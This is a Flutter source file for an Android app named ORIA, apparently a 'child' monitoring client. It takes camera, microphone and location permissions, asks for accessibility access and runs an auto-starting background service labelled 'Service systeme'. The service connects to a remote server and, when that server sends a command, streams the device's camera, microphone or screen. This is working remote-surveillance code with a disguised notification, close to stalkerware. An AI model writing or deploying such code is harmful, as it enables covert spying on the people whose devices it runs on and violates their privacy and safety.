import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:android_intent_plus/android_intent.dart';
import 'stream_service.dart';
import 'dart:ui';

const String SERVER_URL = 'https://oria-server-tzc1.onrender.com';

final List<String> _visibleLogs = [];
void addLog(String msg) {
  final line = '${DateTime.now().toString().substring(11, 19)} $msg';
  _visibleLogs.insert(0, line);
  if (_visibleLogs.length > 20) _visibleLogs.removeLast();
  print('[ORIA] $line');
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  addLog('App demarree');

  await [
    Permission.camera,
    Permission.microphone,
    Permission.location,
    Permission.notification,
    Permission.storage,
  ].request();
  addLog('Permissions demandees');

  final prefs = await SharedPreferences.getInstance();
  final accessibilityEnabled = prefs.getBool('accessibility_enabled') ?? false;

  if (!accessibilityEnabled) {
    runApp(const EnableAccessibilityScreen());
    return;
  }
  addLog('Accessibilite: ACTIVEE');

  await initializeService();
  runApp(const OriaChildApp());
}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();
  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      foregroundServiceNotificationId: 888,
      initialNotificationTitle: 'Service systeme',
      initialNotificationContent: 'Actif',
    ),
    iosConfiguration: IosConfiguration(autoStart: true, onForeground: onStart),
  );
  await service.startService();
  addLog('Service arriere-plan demarre');
}

@pragma('vm:entry-point')
void onStart(ServiceInstance instance) async {
  DartPluginRegistrant.ensureInitialized();
  final deviceInfo = DeviceInfoPlugin();
  final androidInfo = await deviceInfo.androidInfo;
  final deviceId = androidInfo.id;
  final deviceName = '${androidInfo.manufacturer} ${androidInfo.model}';

  IO.Socket? socket;
  StreamService? streamService;

  void connect() {
    socket?.dispose();
    socket = IO.io(SERVER_URL, <String, dynamic>{
      'transports': ['websocket'],
      'autoConnect': true,
      'reconnection': true,
      'reconnectionDelay': 5000,
      'reconnectionAttempts': 999,
    });

    socket!.on('connect', (_) {
      addLog('Connecte au serveur');
      socket!.emit('register_child', {'deviceId': deviceId, 'deviceName': deviceName});
      addLog('Enregistre: $deviceName');
    });

    socket!.on('execute_command', (data) async {
      final action = data['action'];
      addLog('COMMANDE RECUE: $action');

      try {
        if (action == 'start_camera') {
          await streamService?.stop();
          streamService = StreamService(socket!, 'parent-main');
          await streamService!.startCamera();
          addLog('CAMERA DEMARREE');
        } else if (action == 'start_mic') {
          await streamService?.stop();
          streamService = StreamService(socket!, 'parent-main');
          await streamService!.startMic();
          addLog('MICRO DEMARRE');
        } else if (action == 'start_screen') {
          await streamService?.stop();
          streamService = StreamService(socket!, 'parent-main');
          await streamService!.startScreen();
          addLog('ECRAN DEMARRE');
        } else if (action == 'stop_stream') {
          await streamService?.stop();
          streamService = null;
          addLog('STREAM ARRETE');
        }
      } catch (e) {
        addLog('ERREUR: $e');
      }
    });

    socket!.on('signal', (msg) {
      addLog('Signal recu: ${msg['type']}');
      streamService?.handleSignal(msg);
    });

    socket!.on('connect_error', (_) => addLog('Reconnexion...'));
    socket!.on('disconnect', (_) => addLog('Deconnecte'));
  }
  connect();
}

class EnableAccessibilityScreen extends StatelessWidget {
  const EnableAccessibilityScreen({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        backgroundColor: Colors.black,
        body: Center(
          child: Padding(
            padding: const EdgeInsets.all(32),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(Icons.accessibility_new, color: Colors.indigo, size: 80),
                const SizedBox(height: 24),
                const Text('Activation requise', style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold)),
                const SizedBox(height: 16),
                const Text('ORIA a besoin du service accessibilite.\n\n1. Cliquez ci-dessous\n2. Activez ORIA\n3. Revenez ici', textAlign: TextAlign.center, style: TextStyle(color: Colors.grey, fontSize: 14)),
                const SizedBox(height: 32),
                FilledButton.icon(
                  onPressed: () async {
                    const intent = AndroidIntent(action: 'android.settings.ACCESSIBILITY_SETTINGS');
                    await intent.launch();
                  },
                  icon: const Icon(Icons.settings_accessibility),
                  label: const Text('OUVRIR PARAMETRES'),
                  style: FilledButton.styleFrom(minimumSize: const Size(double.infinity, 50)),
                ),
                const SizedBox(height: 16),
                TextButton(
                  onPressed: () async {
                    final prefs = await SharedPreferences.getInstance();
                    await prefs.setBool('accessibility_enabled', true);
                    await initializeService();
                    runApp(const OriaChildApp());
                  },
                  child: const Text('Deja active > Continuer', style: TextStyle(color: Colors.grey)),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

class OriaChildApp extends StatefulWidget {
  const OriaChildApp({super.key});
  @override
  State<OriaChildApp> createState() => _OriaChildAppState();
}

class _OriaChildAppState extends State<OriaChildApp> {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        backgroundColor: Colors.black,
        body: SafeArea(
          child: Column(
            children: [
              const Padding(
                padding: EdgeInsets.all(16),
                child: Row(
                  children: [
                    Icon(Icons.visibility_off, color: Colors.grey, size: 32),
                    SizedBox(width: 12),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text("ORIA Active", style: TextStyle(color: Colors.grey, fontSize: 16)),
                          Text("Service en arriere-plan actif.", style: TextStyle(color: Colors.grey, fontSize: 11)),
                        ],
                      ),
                    ),
                  ],
                ),
              ),
              const Divider(color: Colors.grey),
              Expanded(
                child: ListView.builder(
                  padding: const EdgeInsets.all(12),
                  itemCount: _visibleLogs.length,
                  itemBuilder: (_, i) => Padding(
                    padding: const EdgeInsets.only(bottom: 4),
                    child: Text(
                      _visibleLogs[i],
                      style: TextStyle(
                        color: _visibleLogs[i].contains('ERREUR') ? Colors.red :
                               _visibleLogs[i].contains('CAMERA') || _visibleLogs[i].contains('MICRO') || _visibleLogs[i].contains('ECRAN') ? Colors.green :
                               _visibleLogs[i].contains('COMMANDE') ? Colors.yellow :
                               Colors.grey[400],
                        fontSize: 12,
                        fontFamily: 'monospace',
                      ),
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}